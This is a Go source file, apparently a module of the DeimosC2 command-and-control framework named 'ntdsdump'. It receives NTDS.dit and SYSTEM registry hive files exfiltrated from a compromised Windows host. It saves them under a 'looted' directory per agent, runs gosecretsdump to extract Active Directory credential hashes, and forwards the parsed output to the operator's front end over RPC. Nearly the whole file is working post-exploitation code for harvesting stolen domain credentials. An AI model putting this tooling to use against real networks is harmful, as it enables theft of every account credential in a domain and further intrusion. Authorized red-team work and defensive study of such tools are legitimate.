package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/rpc"
	"net/rpc/jsonrpc"
	"os"
	"path"
	"path/filepath"
	"strconv"
	"sync"

	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/logging"
	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/modulescommon"
	"github.com/C-Sto/gosecretsdump/cmd"
)

//ModData is used for RPC
type ModData int

var wg sync.WaitGroup

var rpcPort = 63002
var client *rpc.Client

type downloadFiles struct {
	NTDSfile   string
	NTDSdata   string
	Systemfile string
	Systemdata string
}

//Module is the datastructure of modules
type Module struct {
	Name string //Holds the name of the module
	Port int    //Holds the RPC port of the module server
}

func startModuleServer() {
	logging.Logger.Println("Modules RPC server starting up")
	modRPC := new(ModData)
	rpc.Register(modRPC)
	rpc.HandleHTTP()
	var l net.Listener
	var e error
	for {
		s := strconv.Itoa(rpcPort)
		l, e = net.Listen("tcp", "127.0.0.1:"+s)
		if e == nil {
			break
		}
		rpcPort++
	}
	wg.Add(1)
	//go http.Serve(l, nil)
	for {
		conn, err := l.Accept()
		if err != nil {
			log.Fatal(err)
		}

		go rpc.ServeCodec(jsonrpc.NewServerCodec(conn))
	}

}

//RecData will take in data to be acted on from the server
func (t *ModData) RecData(data modulescommon.ModuleCom, reply *string) error {
	logging.Logger.Println("RecData called!")
	r := server(data)
	logging.Logger.Println(r)
	*reply = r
	return nil
}

//EndServer will be called in order to end the module
func (t *ModData) EndServer(end bool, reply *bool) error {
	logging.Logger.Println("EndServer called!")
	if end == true {
		defer wg.Done()
	}
	return nil
}

//NEED TO CHANGE TO RECEIVE ALL THE HIVE FILES
func server(data modulescommon.ModuleCom) string {
	cwd, _ := os.Getwd()

	//Assign dmpFile content to the content of the struct downloadOutput
	var dmpFile downloadFiles
	json.Unmarshal(data.Data, &dmpFile)

	//NTDS FILE
	ntdsdmpData, _ := base64.StdEncoding.DecodeString(dmpFile.NTDSdata)
	ntdsPath := path.Join(cwd, "resources", "looted", data.AgentKey, "files", dmpFile.NTDSfile)
	ntdsName := fmt.Sprintf(ntdsPath)
	ntdsfile, _ := os.Create(ntdsName)
	ntdsfile.Write(ntdsdmpData)

	//SYSTEM HIVE FILE
	systemdmpData, _ := base64.StdEncoding.DecodeString(dmpFile.Systemdata)
	systemPath := path.Join(cwd, "resources", "looted", data.AgentKey, "files", dmpFile.Systemfile)
	systemName := fmt.Sprintf(systemPath)
	systemfile, _ := os.Create(systemName)
	systemfile.Write(systemdmpData)

	var reply []byte

	//File for where GoSecretsDump will save the output of NTDS to
	ntdsParsedFile := path.Join(cwd, "resources", "looted", data.AgentKey, "files\\ntds_parsed.txt")
	//using https://github.com/C-Sto/gosecretsdump for parsing NTDS
	cmd.GoSecretsDump(cmd.Settings{systemPath, ntdsPath, false, false, ntdsParsedFile, true, false})

	//Sending NTDS parsed file to the FE
	ntdsParseMsg := modulescommon.ModOutput{
		AgentKey:   data.AgentKey,
		ModuleName: data.ModuleName,
		OutputType: "Link",
		Output:     []byte(filepath.Base(ntdsParsedFile)),
	}

	client.Call("ModData.ModSendData", &ntdsParseMsg, &reply)

	return ""
}

//The correct RPC port needs to be specified in order for the module to work
//this is passed as a commandline command on module startup
func main() {
	port := os.Args[1]
	//Starts up the local RPC server to recieve data
	go startModuleServer()
	logging.Logger.Println("connecting")
	//Makes the connection to the main server
	conn, err := net.Dial("tcp", "127.0.0.1:"+port)
	if err != nil {
		log.Fatal("dialing:", err)
	}

	defer conn.Close()

	client = jsonrpc.NewClient(conn)

	m := Module{"ntdsdump", rpcPort}

	logging.Logger.Println("Checking in..")
	var reply []byte
	//Registers with the main server
	err = client.Call("ModData.ModInit", m, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}

	//Waits till the module is finished
	wg.Wait()
}
